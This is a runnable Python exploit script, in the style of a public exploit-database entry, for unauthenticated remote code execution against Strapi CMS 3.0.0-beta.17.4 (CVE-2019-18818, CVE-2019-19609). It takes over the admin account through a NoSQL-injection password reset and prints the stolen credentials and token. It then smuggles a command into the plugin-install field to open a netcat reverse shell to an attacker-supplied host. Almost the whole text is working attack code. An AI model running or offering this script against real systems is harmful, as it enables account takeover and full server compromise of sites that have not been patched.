# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Modified By: RamPanic
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import sys
import json
import requests
import argparse

from cmd import Cmd
from argparse  import RawTextHelpFormatter

def check_version():

    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit")
    else:
        print("[-] Version mismatch trying the exploit anyway")

def password_reset():

    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}")

def code_exec(ip, port):

    global jwt, url

    payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc {ip} {port} > /tmp/f" # Create reverse shell

    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")

    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({payload})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    
    print(out.text)

if __name__ == ("__main__"):

    parser = argparse.ArgumentParser()

    parser.formatter_class = RawTextHelpFormatter

    parser.description = 'Exploit for CVE-2019-19609'
    parser.usage = "strapi-exploit.py [OPTIONS]"
    
    parser.epilog = """

         Example: ./CVE-2019-19609.py -u http://xxx.xxx.xxxx.xxxx --lhost xxx.xxx.xxx.xxxx --lport 4445 
        
    """

    main_arguments = parser.add_argument_group('main arguments')

    main_arguments.add_argument('--url', '-u', type=str, help='Domain or IP', required=True)
    main_arguments.add_argument('--lhost',  type=str, help='Local Host', required=True)
    main_arguments.add_argument('--lport',  type=int, help='Local Port', required=True)

    args = parser.parse_args()

    url   = args.url
    lhost = args.lhost
    lport = args.lport

    if url.endswith("/"):
        url = url[:-1]
    
    try:

        check_version()
        password_reset()
        code_exec(lhost, lport)    

    except KeyboardInterrupt:

        print("\n[x] Exploit canceled")

        sys.exit(1)
